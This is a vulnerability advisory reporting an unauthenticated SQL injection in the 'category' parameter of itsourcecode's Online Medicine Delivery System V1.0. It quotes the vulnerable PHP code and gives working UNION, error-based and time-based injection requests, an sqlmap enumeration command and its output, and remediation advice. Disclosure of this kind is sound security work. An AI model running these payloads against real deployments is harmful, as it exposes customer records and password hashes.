# itsourcecode Online Medicine Delivery System V1.0 SQL Injection Vulnerability via 'category' Parameter in '/index.php?q=product&category='
---

## 1. Product Information
| Field | Value |
| --- | --- |
| **Product Name** | Online Medicine Delivery System |
| **Product Link** | [https://itsourcecode.com/free-projects/php-project/complete-online-medicine-delivery-system-with-sms-notification-in-php/](https://itsourcecode.com/free-projects/php-project/complete-online-medicine-delivery-system-with-sms-notification-in-php/) |
| **Vendor** | itsourcecode |
| **Affected Version** | V1.0 |
| **Authentication Required** | No, exploitable without any authentication |


## 2. Vulnerability Type
**SQL Injection**

---

## 3. Vulnerability Description
The product category filter interface `/index.php?q=product&category=` of Online Medicine Delivery System contains an SQL injection vulnerability. The interface receives the user-submitted `category` parameter and directly concatenates it into the SQL query's `WHERE CATEGORIES='{$_GET['category']}'` condition without any filtering or escaping. Since the query results are rendered directly to the product listing page via `loadResultList()`, an attacker can use UNION injection to echo arbitrary data onto the page.

**Affected Code**:

`menu.php:18-20`

```php
}elseif(isset($_GET['category'])){
  $query = "SELECT * FROM `tblpromopro` pr , `tblproduct` p , `tblcategory` c
            WHERE pr.`PROID`=p.`PROID` AND  p.`CATEGID` = c.`CATEGID`  AND PROQTY>0 AND CATEGORIES='{$_GET['category']}'";
}
```

---

## 4. Impact
+ **Full Database Data Disclosure**: Through UNION injection, arbitrary data from any database and any table can be directly echoed onto the product listing page, including user password hashes, customer personal information, order data, etc.
+ **No Authentication Required**: This interface is a frontend product category filter feature, accessible and exploitable without any login
+ **Multiple Injection Methods**: Supports 4 injection types (Boolean-based blind, Error-based, Time-based blind, UNION query injection), representing a very broad attack surface

---

## 5. PoC
**UNION Query Injection (data echo)**:

```plain
GET /index.php?q=product&category=Medicine' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b6b7a71,0x584c6461777754565679557972675472465458475242687746456e477a6f66784e6c4c6353587553,0x7170716b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- - HTTP/1.1
Host: onlinemedicinedeliverysystem:9715
Connection: close
```

**Error-based Injection**:

```plain
GET /index.php?q=product&category=Medicine' OR (SELECT 7711 FROM(SELECT COUNT(*),CONCAT(0x716b6b7a71,(SELECT (ELT(7711=7711,1))),0x7170716b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- LuJE HTTP/1.1
Host: onlinemedicinedeliverysystem:9715
Connection: close
```

**Time-based Blind Injection**:

```plain
GET /index.php?q=product&category=Medicine' AND (SELECT 2879 FROM (SELECT(SLEEP(5)))ifHV)-- lDUn HTTP/1.1
Host: onlinemedicinedeliverysystem:9715
Connection: close
```

**sqlmap database enumeration**:

```bash
python sqlmap.py -u "http://<domain:port>/index.php?q=product&category=Medicine" -p category --batch --dbs --dbms=mysql
```

Result:

```plain
available databases [6]:
[*] information_schema
[*] medicinedb
[*] mysql
[*] performance_schema
[*] roocms
[*] sys
```

sqlmap execution screenshot:

![image-20260716192636955](C:\Users\Shawn\AppData\Roaming\Typora\typora-user-images\image-20260716192636955.png)

---

## 6. Remediation
1. **Use Parameterized Queries**
2. **Input Validation**: The `category` parameter should be a valid category name; use whitelist validation (matching against existing categories in the database)

